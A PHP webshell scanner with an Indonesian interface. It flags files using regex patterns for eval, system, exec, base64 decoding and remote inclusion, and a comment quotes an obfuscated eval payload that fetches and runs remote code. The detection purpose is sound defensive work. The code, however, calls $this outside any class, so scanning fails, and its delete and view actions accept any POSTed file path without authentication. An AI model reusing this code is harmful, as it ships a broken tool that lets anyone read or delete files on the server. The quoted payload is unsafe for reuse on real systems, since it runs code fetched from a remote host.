<?php
/* 
 * SIMPLE WEBSHELL SCANNER
 * Versi yang ditingkatkan dengan deteksi pattern yang lebih baik
 */

// Start session hanya jika belum started
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    
    if ($action == 'scan') {
        // Scan files in current directory
        $results = array();
        $scanned_count = 0;
        $suspicious_count = 0;
        
        // Get all files in current directory
        $files = scandir('.');
        if ($files) {
            foreach ($files as $file) {
                if ($file == '.' || $file == '..') continue;
                if (is_dir($file)) continue;
                
                $scanned_count++;
                
                // Check only PHP files and suspicious extensions
                $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                $suspicious_extensions = array('php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'inc', 'txt');
                
                if (in_array($ext, $suspicious_extensions)) {
                    $content = @file_get_contents($file);
                    if ($content) {
                        $suspicious_patterns = array();
                        $score = 0;
                        
                        // Check for dangerous functions dengan pattern yang lebih spesifik
                        $patterns = array(
                            'eval' => array('pattern' => '/\beval\s*\(/i', 'weight' => 3),
                            'base64_decode' => array('pattern' => '/base64_decode\s*\(/i', 'weight' => 2),
                            'system' => array('pattern' => '/\bsystem\s*\(/i', 'weight' => 3),
                            'exec' => array('pattern' => '/\bexec\s*\(/i', 'weight' => 3),
                            'shell_exec' => array('pattern' => '/\bshell_exec\s*\(/i', 'weight' => 3),
                            'passthru' => array('pattern' => '/\bpassthru\s*\(/i', 'weight' => 3),
                            'file_get_contents_remote' => array('pattern' => '/file_get_contents\s*\(\s*[\'"](http|https|ftp):\/\//i', 'weight' => 4),
                            'file_put_contents' => array('pattern' => '/file_put_contents\s*\(/i', 'weight' => 2),
                            'curl_exec' => array('pattern' => '/\bcurl_exec\s*\(/i', 'weight' => 2),
                            'preg_replace_e' => array('pattern' => '/preg_replace\s*\(.*\/e/i', 'weight' => 3),
                            'create_function' => array('pattern' => '/create_function\s*\(/i', 'weight' => 2),
                            'assert' => array('pattern' => '/\bassert\s*\(/i', 'weight' => 2),
                            'gzinflate' => array('pattern' => '/gzinflate\s*\(/i', 'weight' => 2),
                        );
                        
                        foreach ($patterns as $name => $pattern_info) {
                            if (preg_match_all($pattern_info['pattern'], $content, $matches)) {
                                $count = count($matches[0]);
                                $suspicious_patterns[$name] = $count;
                                $score += ($count * $pattern_info['weight']);
                            }
                        }
                        
                        // Check for advanced obfuscation patterns seperti contoh Anda
                        if ($this->detectAdvancedObfuscation($content)) {
                            $suspicious_patterns['advanced_obfuscation'] = true;
                            $score += 5;
                        }
                        
                        // Check for comment stuffing dengan fungsi berbahaya
                        if (preg_match('/\/\*+.*eval.*\*+\//is', $content) || 
                            preg_match('/\/\*+.*base64_decode.*\*+\//is', $content)) {
                            $suspicious_patterns['comment_obfuscation'] = true;
                            $score += 4;
                        }
                        
                        // Check for remote file inclusion
                        if (preg_match('/file_get_contents\s*\(\s*[\'"](http|https|ftp):\/\//i', $content) ||
                            preg_match('/include\s*\(\s*[\'"](http|https|ftp):\/\//i', $content)) {
                            $suspicious_patterns['remote_inclusion'] = true;
                            $score += 4;
                        }
                        
                        // Check for webshell specific patterns
                        if (preg_match('/\$_GET\s*\[\s*[\'"]cmd[\'"]\s*\]/i', $content) ||
                            preg_match('/\$_POST\s*\[\s*[\'"]pass[\'"]\s*\]/i', $content) ||
                            preg_match('/\$_REQUEST\s*\[\s*[\'"]command[\'"]\s*\]/i', $content)) {
                            $suspicious_patterns['webshell_params'] = true;
                            $score += 3;
                        }
                        
                        // Check for file upload features
                        if (preg_match('/move_uploaded_file\s*\(/i', $content) && 
                            preg_match('/\$_FILES/i', $content)) {
                            $suspicious_patterns['upload_feature'] = true;
                            $score += 2;
                        }
                        
                        if ($score > 0) {
                            $suspicious_count++;
                            $results[] = array(
                                'file' => $file,
                                'score' => $score,
                                'patterns' => $suspicious_patterns,
                                'size' => filesize($file),
                                'modified' => date('Y-m-d H:i:s', filemtime($file)),
                                'content_sample' => substr($content, 0, 500) // Sample content untuk preview
                            );
                        }
                    }
                }
            }
        }
        
        // Sort by score descending
        usort($results, function($a, $b) {
            return $b['score'] - $a['score'];
        });
        
        $_SESSION['scan_results'] = array(
            'files' => $results,
            'stats' => array(
                'scanned' => $scanned_count,
                'suspicious' => $suspicious_count
            )
        );
        
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
        
    } elseif ($action == 'delete' && isset($_POST['file'])) {
        $file = $_POST['file'];
        if (file_exists($file) && is_file($file)) {
            if (unlink($file)) {
                $_SESSION['message'] = "File berhasil dihapus: " . htmlspecialchars($file);
            } else {
                $_SESSION['error'] = "Gagal menghapus file: " . htmlspecialchars($file);
            }
        }
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
        
    } elseif ($action == 'view_content' && isset($_POST['file'])) {
        $file = $_POST['file'];
        if (file_exists($file) && is_file($file)) {
            $content = file_get_contents($file);
            if ($content !== false) {
                $_SESSION['file_content'] = htmlspecialchars($content);
                $_SESSION['file_name'] = $file;
            }
        }
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
}

// Function untuk mendeteksi obfuscation advanced seperti contoh Anda
function detectAdvancedObfuscation($content) {
    // Pattern untuk mendeteksi: <?=/****/@null; /********/ /**/ /********/@eval/****/("?>".file_get_contents/*******/("https://example.com"));/**/?>
    $patterns = array(
        // Pattern untuk comment stuffing dengan fungsi berbahaya
        '/\/\*+.*@eval.*\*+.*\(.*file_get_contents.*\*+.*\(/is',
        '/eval\s*\(\s*[\'\"].*\.\s*file_get_contents\s*\(/i',
        '/\/\*+.*\*\/\s*@\w+\s*\/\*+.*\*\/\s*@eval/is',
        // Pattern untuk multiple comment blocks dengan fungsi berbahaya
        '/<\?php\s*\/\*[^*]+\*\/\s*@\w+\s*\/\*[^*]+\*\/\s*@eval/i',
    );
    
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $content)) {
            return true;
        }
    }
    
    // Deteksi kombinasi comment stuffing + eval + remote content
    if (preg_match('/\/\*+/', $content) && 
        preg_match('/eval\s*\(/i', $content) && 
        preg_match('/file_get_contents\s*\(\s*[\'"](http|https):\/\//i', $content)) {
        return true;
    }
    
    return false;
}

// Simple function to get file URL
function getFileUrl($filename) {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $script_path = dirname($_SERVER['SCRIPT_NAME']);
    
    if ($script_path == '\\') $script_path = '';
    
    return $protocol . '://' . $host . $script_path . '/' . $filename;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Advanced WebShell Scanner</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
        .btn { padding: 10px 15px; margin: 5px; border: none; border-radius: 3px; cursor: pointer; font-size: 14px; }
        .btn-scan { background: #007bff; color: white; }
        .btn-view { background: #28a745; color: white; }
        .btn-delete { background: #dc3545; color: white; }
        .btn-content { background: #ffc107; color: black; }
        .message { padding: 10px; margin: 10px 0; border-radius: 3px; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .file-item { border: 1px solid #ddd; padding: 20px; margin: 15px 0; border-radius: 5px; background: #fafafa; }
        .file-name { font-weight: bold; font-size: 18px; color: #333; margin-bottom: 10px; }
        .file-score { color: #dc3545; font-weight: bold; font-size: 16px; margin-bottom: 5px; }
        .file-info { color: #666; font-size: 14px; margin-bottom: 5px; }
        .pattern { background: #fff3cd; padding: 4px 10px; margin: 3px; border-radius: 3px; display: inline-block; font-size: 12px; font-weight: bold; border: 1px solid #ffeaa7; }
        .pattern.high-risk { background: #f8d7da; border-color: #f5c6cb; }
        .content-preview { background: #2c3e50; color: #ecf0f1; padding: 20px; border: 1px solid #34495e; margin: 15px 0; font-family: 'Courier New', monospace; white-space: pre-wrap; border-radius: 5px; max-height: 500px; overflow-y: auto; }
        .stats { background: #e9ecef; padding: 20px; border-radius: 5px; margin: 20px 0; }
        .content-sample { background: #f8f9fa; padding: 15px; border: 1px solid #e9ecef; margin: 10px 0; font-family: monospace; font-size: 12px; white-space: pre-wrap; max-height: 200px; overflow-y: auto; }
        .high-risk-item { border-left: 5px solid #dc3545; background: #fdf2f2; }
        .medium-risk-item { border-left: 5px solid #ffc107; background: #fffbf2; }
        .low-risk-item { border-left: 5px solid #28a745; background: #f2fdf2; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Advanced WebShell Scanner</h1>
            <p>Detektor webshell dengan pattern matching tingkat lanjut</p>
        </div>

        <?php if (isset($_SESSION['message'])): ?>
            <div class="message success">✅ <?php echo $_SESSION['message']; unset($_SESSION['message']); ?></div>
        <?php endif; ?>

        <?php if (isset($_SESSION['error'])): ?>
            <div class="message error">❌ <?php echo $_SESSION['error']; unset($_SESSION['error']); ?></div>
        <?php endif; ?>

        <div style="text-align: center; margin: 25px 0;">
            <form method="post">
                <input type="hidden" name="action" value="scan">
                <button type="submit" class="btn btn-scan">🔍 Mulai Scan Mendalam</button>
            </form>
        </div>

        <?php if (isset($_SESSION['file_content'])): ?>
            <div class="content-preview">
                <h3 style="color: #ecf0f1; margin-bottom: 15px;">Konten File: <?php echo htmlspecialchars($_SESSION['file_name']); ?></h3>
                <pre><?php echo $_SESSION['file_content']; ?></pre>
            </div>
            <?php unset($_SESSION['file_content'], $_SESSION['file_name']); ?>
        <?php endif; ?>

        <?php if (isset($_SESSION['scan_results'])): 
            $results = $_SESSION['scan_results'];
            $files = $results['files'];
            $stats = $results['stats'];
        ?>
            <div class="stats">
                <h3>📊 Hasil Scanning</h3>
                <p>✅ File yang di-scan: <?php echo $stats['scanned']; ?></p>
                <p>⚠️ File mencurigakan: <?php echo $stats['suspicious']; ?></p>
            </div>

            <?php if (!empty($files)): ?>
                <div>
                    <h3 style="color: #dc3545; margin-bottom: 20px;">🚨 File Mencurigakan Terdeteksi</h3>
                    <?php foreach ($files as $file): 
                        $risk_class = $file['score'] >= 10 ? 'high-risk-item' : ($file['score'] >= 5 ? 'medium-risk-item' : 'low-risk-item');
                    ?>
                        <div class="file-item <?php echo $risk_class; ?>">
                            <div class="file-name">📁 <?php echo htmlspecialchars($file['file']); ?></div>
                            <div class="file-score">🎯 Skor Risiko: <?php echo $file['score']; ?></div>
                            <div class="file-info">📏 Ukuran: <?php echo number_format($file['size']); ?> bytes</div>
                            <div class="file-info">🕒 Modifikasi: <?php echo $file['modified']; ?></div>
                            
                            <div style="margin: 15px 0;">
                                <strong>🔍 Pola Terdeteksi:</strong><br>
                                <?php foreach ($file['patterns'] as $pattern => $count): 
                                    $pattern_class = in_array($pattern, ['advanced_obfuscation', 'remote_inclusion', 'eval']) ? 'high-risk' : '';
                                ?>
                                    <span class="pattern <?php echo $pattern_class; ?>"><?php echo htmlspecialchars($pattern) . ($count !== true ? ": $count" : ''); ?></span>
                                <?php endforeach; ?>
                            </div>

                            <?php if (!empty($file['content_sample'])): ?>
                                <div class="content-sample">
                                    <strong>Sample Konten:</strong><br>
                                    <?php echo htmlspecialchars($file['content_sample']); ?>
                                </div>
                            <?php endif; ?>

                            <div style="margin-top: 15px;">
                                <form method="post" style="display: inline;">
                                    <input type="hidden" name="action" value="view_content">
                                    <input type="hidden" name="file" value="<?php echo htmlspecialchars($file['file']); ?>">
                                    <button type="submit" class="btn btn-content">📄 Lihat Konten Lengkap</button>
                                </form>

                                <a href="<?php echo getFileUrl($file['file']); ?>" target="_blank" class="btn btn-view" onclick="return confirm('⚠️ Buka URL file ini? Pastikan aman!')">🌐 Buka URL</a>

                                <form method="post" style="display: inline;">
                                    <input type="hidden" name="action" value="delete">
                                    <input type="hidden" name="file" value="<?php echo htmlspecialchars($file['file']); ?>">
                                    <button type="submit" class="btn btn-delete" onclick="return confirm('❌ Yakin hapus file ini? Tindakan tidak dapat dibatalkan!')">🗑️ Hapus</button>
                                </form>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php else: ?>
                <div style="text-align: center; padding: 40px; color: #28a745;">
                    <h3>✅ Tidak ditemukan file mencurigakan</h3>
                    <p>Server Anda tampak bersih dari webshell yang terdeteksi</p>
                </div>
            <?php endif; ?>
            
            <?php unset($_SESSION['scan_results']); ?>
        <?php endif; ?>
    </div>

    <script>
        // Konfirmasi untuk aksi berbahaya
        document.addEventListener('DOMContentLoaded', function() {
            // Konfirmasi hapus file
            var deleteButtons = document.querySelectorAll('.btn-delete');
            deleteButtons.forEach(function(button) {
                button.addEventListener('click', function(e) {
                    if (!confirm('❌ PERINGATAN: Yakin ingin menghapus file ini?\nTindakan ini tidak dapat dibatalkan!')) {
                        e.preventDefault();
                    }
                });
            });

            // Konfirmasi buka URL
            var viewButtons = document.querySelectorAll('.btn-view');
            viewButtons.forEach(function(button) {
                button.addEventListener('click', function(e) {
                    if (!confirm('⚠️ PERINGATAN: Membuka URL file mencurigakan bisa berbahaya.\nPastikan Anda tahu apa yang dilakukan!\nLanjutkan?')) {
                        e.preventDefault();
                    }
                });
            });
        });
    </script>
</body>
</html>
